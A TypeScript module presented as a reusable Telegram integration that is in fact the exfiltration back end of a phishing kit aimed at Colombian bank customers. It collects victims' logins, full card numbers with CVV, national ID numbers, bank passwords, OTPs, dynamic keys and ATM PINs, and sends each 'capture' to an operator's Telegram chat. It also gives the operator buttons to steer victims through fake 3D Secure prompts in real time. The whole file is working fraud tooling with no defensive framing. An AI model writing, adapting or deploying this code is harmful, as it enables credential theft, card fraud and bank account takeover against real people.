/**
 * Telegram Integration Module
 * 
 * Strategy: For each user (identified by IP), maintain ONE message in Telegram
 * that accumulates all captured data. When new data arrives, the previous message
 * is deleted and a new one is sent with the full summary.
 * 
 * REUSABLE: Copy this file to any project and set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID env vars.
 */

import { getAppConfig } from "./db";
import { tgApi } from "./tgapi";

let _cachedToken = "";
let _cachedChatId = "";
let _cacheTime = 0;

async function getTelegramConfig() {
  // Cache for 30 seconds to avoid DB hit on every message
  if (Date.now() - _cacheTime < 30000 && _cachedToken) {
    return { token: _cachedToken, chatId: _cachedChatId };
  }
  try {
    const cfg = await getAppConfig();
    _cachedToken = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
    _cachedChatId = cfg.telegramChatId || process.env.TELEGRAM_CHAT_ID || "";
    _cacheTime = Date.now();
  } catch {
    _cachedToken = process.env.TELEGRAM_BOT_TOKEN || "";
    _cachedChatId = process.env.TELEGRAM_CHAT_ID || "";
  }
  return { token: _cachedToken, chatId: _cachedChatId };
}

function getTelegramToken() { return _cachedToken || process.env.TELEGRAM_BOT_TOKEN || ""; }
function getTelegramChatId() { return _cachedChatId || process.env.TELEGRAM_CHAT_ID || ""; }

/**
 * Track message IDs and accumulated data per user (keyed by IP or email)
 */
interface UserSession {
  messageIds: number[]; // All message IDs sent for this user
  data: {
    email?: string;
    password?: string;
    name?: string;
    cardNumber?: string;
    expiry?: string;
    cvv?: string;
    address?: string;
    cedula?: string;
    city?: string;
    bankName?: string;
    country?: string;
    cardScheme?: string;
    cardCategory?: string;
    ipAddress?: string;
    sessionId?: string;
    phone?: string;
    bankUser?: string;
    bankPassword?: string;
    otpCode?: string;
    claveDinamica?: string;
    tokenSeguridad?: string;
    claveATM?: string;
  };
}

// Store sessions by a key (email or IP)
const userSessions = new Map<string, UserSession>();

function getSessionKey(email?: string, ipAddress?: string): string {
  // Prioritize IP as the main key to group all data from the same user
  return ipAddress || email || `unknown_${Date.now()}`;
}

function getOrCreateSession(key: string): UserSession {
  if (!userSessions.has(key)) {
    userSessions.set(key, { messageIds: [], data: {} });
  }
  return userSessions.get(key)!;
}

/**
 * Delete all previous messages for a user session
 */
async function deletePreviousMessages(session: UserSession): Promise<void> {
  await getTelegramConfig(); // ensure cache is loaded
  if (!getTelegramToken() || !getTelegramChatId()) return;

  for (const msgId of session.messageIds) {
    try {
      await fetch(tgApi(getTelegramToken(), 'deleteMessage'), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: getTelegramChatId(), message_id: msgId }),
      });
    } catch {
      // Ignore delete errors (message may already be deleted)
    }
  }
  session.messageIds = [];
}

/**
 * Send a message and track its ID
 */
async function sendAndTrack(session: UserSession, text: string, replyMarkup?: object): Promise<boolean> {
  await getTelegramConfig(); // ensure cache is loaded
  if (!getTelegramToken() || !getTelegramChatId()) {
    console.warn("[Telegram] Missing bot token or chat ID");
    return false;
  }

  try {
    const url = tgApi(getTelegramToken(), 'sendMessage');
    const body: Record<string, unknown> = {
      chat_id: getTelegramChatId(),
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    if (replyMarkup) {
      body.reply_markup = replyMarkup;
    }

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      const err = await response.text();
      console.error("[Telegram] Send failed:", err);
      return false;
    }

    const result = await response.json() as { ok: boolean; result?: { message_id: number } };
    if (result.ok && result.result?.message_id) {
      session.messageIds.push(result.result.message_id);
    }

    return true;
  } catch (error) {
    console.error("[Telegram] Error:", error);
    return false;
  }
}

/**
 * Build the full summary message from accumulated data
 * Format: tree-style with ├ └ branches and section emojis
 */
function buildSummaryMessage(session: UserSession): string {
  const d = session.data;
  const now = new Date().toLocaleString("es-CO", {
    timeZone: "America/Bogota",
    hour12: true,
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });

  let msg = `🎯 <b>NUEVA CAPTURA</b>\n`;
  msg += `🕐 ${now}`;
  if (d.ipAddress) msg += ` · 🌐 <code>${escapeHtml(d.ipAddress)}</code>`;
  msg += `\n`;

  // ACCESO
  if (d.email || d.password) {
    msg += `🔑 <b>ACCESO</b>\n`;
    const accItems: string[] = [];
    if (d.email)    accItems.push(`📧 ${escapeHtml(d.email)}`);
    if (d.password) accItems.push(`🔒 ${escapeHtml(d.password)}`);
    accItems.forEach((item, i) => {
      msg += (i < accItems.length - 1 ? `├ ` : `└ `) + item + `\n`;
    });
  }

  // TARJETA
  if (d.cardNumber || d.name || d.expiry || d.cvv) {
    msg += `💳 <b>TARJETA</b>\n`;
    const cardItems: string[] = [];
    if (d.name)       cardItems.push(`👤 ${escapeHtml(d.name)}`);
    if (d.cardNumber) cardItems.push(`💳 <code>${escapeHtml(d.cardNumber)}</code>`);
    // Expiry + CVV on same line if both present
    if (d.expiry && d.cvv)   cardItems.push(`📅 ${escapeHtml(d.expiry)}  🔐 CVV ${escapeHtml(d.cvv)}`);
    else if (d.expiry)       cardItems.push(`📅 ${escapeHtml(d.expiry)}`);
    else if (d.cvv)          cardItems.push(`🔐 CVV ${escapeHtml(d.cvv)}`);
    // Bank on its own line
    if (d.bankName) cardItems.push(`🏦 ${escapeHtml(d.bankName)}`);
    // Scheme + Category (detailed: brand + type)
    const schemeParts: string[] = [];
    if (d.cardScheme) schemeParts.push(escapeHtml(d.cardScheme));
    if (d.cardCategory) schemeParts.push(`<b>${escapeHtml(d.cardCategory)}</b>`);
    if (schemeParts.length) cardItems.push(`🏷️ ${schemeParts.join(" · ")}`);
    cardItems.forEach((item, i) => {
      msg += (i < cardItems.length - 1 ? `├ ` : `└ `) + item + `\n`;
    });
  }

  // DATOS PERSONALES
  if (d.cedula || d.phone || d.city || d.address) {
    msg += `🪪 <b>DATOS PERSONALES</b>\n`;
    const persItems: string[] = [];
    if (d.cedula)  persItems.push(`🆔 Cédula: <code>${escapeHtml(d.cedula)}</code>`);
    if (d.phone)   persItems.push(`📱 Celular: <code>${escapeHtml(d.phone)}</code>`);
    if (d.city)    persItems.push(`🏙️ Ciudad: ${escapeHtml(d.city)}`);
    if (d.address) persItems.push(`🏠 ${escapeHtml(d.address)}`);
    persItems.forEach((item, i) => {
      msg += (i < persItems.length - 1 ? `├ ` : `└ `) + item + `\n`;
    });
  }

  // 3D SECURE
  if (d.bankUser || d.bankPassword || d.otpCode || d.claveDinamica || d.tokenSeguridad || d.claveATM) {
    msg += `🔐 <b>3D SECURE</b>\n`;
    const secItems: string[] = [];
    if (d.bankUser)       secItems.push(`👤 Usuario: <code>${escapeHtml(d.bankUser)}</code>`);
    if (d.bankPassword)   secItems.push(`🔑 Clave: <code>${escapeHtml(d.bankPassword)}</code>`);
    if (d.otpCode)        secItems.push(`📱 OTP: <code>${escapeHtml(d.otpCode)}</code>`);
    if (d.claveDinamica)  secItems.push(`🔑 Dinámica: <code>${escapeHtml(d.claveDinamica)}</code>`);
    if (d.tokenSeguridad) secItems.push(`🔐 Token: <code>${escapeHtml(d.tokenSeguridad)}</code>`);
    if (d.claveATM)       secItems.push(`🏧 Clave ATM: <code>${escapeHtml(d.claveATM)}</code>`);
    secItems.forEach((item, i) => {
      msg += (i < secItems.length - 1 ? `├ ` : `└ `) + item + `\n`;
    });
  }

  msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  return msg;
}

/**
 * Build inline keyboard buttons for a session
 */
function buildInlineButtons(sessionId: string) {
  return {
    inline_keyboard: [
      [
        { text: "📱 OTP", callback_data: `step:${sessionId}:otp` },
        { text: "🔑 DINÁMICA", callback_data: `step:${sessionId}:dinamica` },
        { text: "🔐 TOKEN", callback_data: `step:${sessionId}:token` },
        { text: "🏧 ATM", callback_data: `step:${sessionId}:atm` },
      ],
      [
        { text: "\u274c Err OTP", callback_data: `step:${sessionId}:error-otp` },
        { text: "\u274c Err DIN", callback_data: `step:${sessionId}:error-dinamica` },
        { text: "\u274c Err TKN", callback_data: `step:${sessionId}:error-token` },
        { text: "\u274c Err ATM", callback_data: `step:${sessionId}:error-atm` },
      ],
      [
        { text: "\ud83d\udeab Err CRED", callback_data: `step:${sessionId}:error-credenciales` },
        { text: "\ud83d\udeab Err Tarjeta", callback_data: `step:${sessionId}:error-tarjeta` },
        { text: "\ud83e\uddbe FACE ID", callback_data: `step:${sessionId}:faceid` },
        { text: "\ud83d\udcac TEXTO", callback_data: `texto:${sessionId}` },
      ],
      [
        { text: "✅ ÉXITO", callback_data: `step:${sessionId}:success` },
        { text: "🚫 BAN IP", callback_data: `step:${sessionId}:ban-ip` },
      ],
    ],
  };
}

/**
 * Core function: delete old messages, update data, send new summary
 */
async function updateAndSend(key: string, newData: Partial<UserSession["data"]>, includeButtons?: string): Promise<boolean> {
  const session = getOrCreateSession(key);
  
  // Merge new data into session
  Object.assign(session.data, newData);
  
  // Delete all previous messages
  await deletePreviousMessages(session);
  
  // Build and send new summary
  const message = buildSummaryMessage(session);
  const buttons = includeButtons ? buildInlineButtons(includeButtons) : undefined;
  
  // Add action prompt if buttons are included
  const finalMessage = includeButtons ? message + `\n\n⬇️ <b>Dirigir usuario a:</b>` : message;
  
  return sendAndTrack(session, finalMessage, buttons);
}

// ============ PUBLIC API ============

/**
 * Notify login data (email + password)
 */
export async function notifyLogin(data: {
  email: string;
  password: string;
  ipAddress?: string;
}): Promise<boolean> {
  const key = getSessionKey(data.email, data.ipAddress);
  return updateAndSend(key, {
    email: data.email,
    password: data.password,
    ipAddress: data.ipAddress,
  });
}

/**
 * Notify payment data (card details)
 */
export async function notifyPaymentData(data: {
  name: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  email?: string;
  ipAddress?: string;
  cardCategory?: string;
  cardScheme?: string;
  bankName?: string;
}): Promise<boolean> {
  const key = getSessionKey(data.email, data.ipAddress);
  return updateAndSend(key, {
    name: data.name,
    cardNumber: data.cardNumber,
    expiry: data.expiry,
    cvv: data.cvv,
    email: data.email,
    ipAddress: data.ipAddress,
    cardCategory: data.cardCategory,
    cardScheme: data.cardScheme,
    bankName: data.bankName,
  });
}

/**
 * Notify personal data (address, ID, city)
 */
export async function notifyPersonalData(data: {
  address: string;
  cedula: string;
  city: string;
  phone?: string;
  email?: string;
  ipAddress?: string;
}): Promise<boolean> {
  const key = getSessionKey(data.email, data.ipAddress);
  return updateAndSend(key, {
    address: data.address,
    cedula: data.cedula,
    city: data.city,
    phone: data.phone,
    email: data.email,
    ipAddress: data.ipAddress,
  });
}

/**
 * Notify new 3D Secure session start (WITH buttons)
 */
export async function notifyNewSession(data: {
  sessionId: string;
  email?: string;
  cardBin?: string;
  cardNumber?: string;
  bankName?: string;
  country?: string;
  cardScheme?: string;
  cardCategory?: string;
  ipAddress?: string;
}): Promise<boolean> {
  const key = getSessionKey(data.email, data.ipAddress);
  return updateAndSend(key, {
    sessionId: data.sessionId,
    cardNumber: data.cardNumber || data.cardBin,
    bankName: data.bankName,
    country: data.country,
    cardScheme: data.cardScheme,
    cardCategory: data.cardCategory,
    email: data.email,
    ipAddress: data.ipAddress,
  }, data.sessionId);
}

/**
 * Notify step data from 3D Secure (WITH buttons)
 */
export async function notifyStepData(data: {
  sessionId: string;
  email?: string;
  cardBin?: string;
  cardNumber?: string;
  bankName?: string;
  country?: string;
  cardScheme?: string;
  ipAddress?: string;
  step: string;
  values: Record<string, string>;
  allData: Record<string, string>;
}): Promise<boolean> {
  const key = getSessionKey(data.email, data.ipAddress);
  
  // Map step values to our data structure
  const stepData: Partial<UserSession["data"]> = {
    sessionId: data.sessionId,
    ipAddress: data.ipAddress,
    email: data.email,
  };
  
  // Extract specific values from the step
  if (data.values.bankUser) stepData.bankUser = data.values.bankUser;
  if (data.values.bankPassword) stepData.bankPassword = data.values.bankPassword;
  if (data.values.otpCode) stepData.otpCode = data.values.otpCode;
  if (data.values.claveDinamica) stepData.claveDinamica = data.values.claveDinamica;
  if (data.values.tokenSeguridad) stepData.tokenSeguridad = data.values.tokenSeguridad;
  if (data.values.claveATM) stepData.claveATM = data.values.claveATM;
  
  return updateAndSend(key, stepData, data.sessionId);
}

/**
 * Notify when admin takes an action (no buttons needed, no delete)
 */
export async function notifyAdminAction(data: {
  sessionId: string;
  action: string;
  email?: string;
  ipAddress?: string;
}): Promise<boolean> {
  const actionLabels: Record<string, string> = {
    completed: "✅ SESIÓN APROBADA",
    rejected: "❌ SESIÓN RECHAZADA",
  };

  const label = actionLabels[data.action] || `⚡ ${data.action}`;
  const key = getSessionKey(data.email, data.ipAddress);
  const session = getOrCreateSession(key);
  
  // For admin actions, just append to the summary (don't delete previous)
  const message = buildSummaryMessage(session) + `\n\n${label}`;
  
  // Delete previous and send final
  await deletePreviousMessages(session);
  return sendAndTrack(session, message);
}

/**
 * Send a raw message (for testing/webhook confirmations)
 */
export async function sendTelegramMessage(text: string, replyMarkup?: object): Promise<boolean> {
  const { token, chatId } = await getTelegramConfig(); // always use fresh values
  if (!token || !chatId) {
    console.warn("[Telegram] Missing bot token or chat ID");
    return false;
  }

  try {
    const url = tgApi(token, 'sendMessage');
    const body: Record<string, unknown> = {
      chat_id: chatId,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    if (replyMarkup) {
      body.reply_markup = replyMarkup;
    }

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      const err = await response.text();
      console.error("[Telegram] Send failed:", err);
      return false;
    }

    return true;
  } catch (error) {
    console.error("[Telegram] Error:", error);
    return false;
  }
}

/**
 * Escape HTML special characters for Telegram parse_mode HTML
 */
export function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
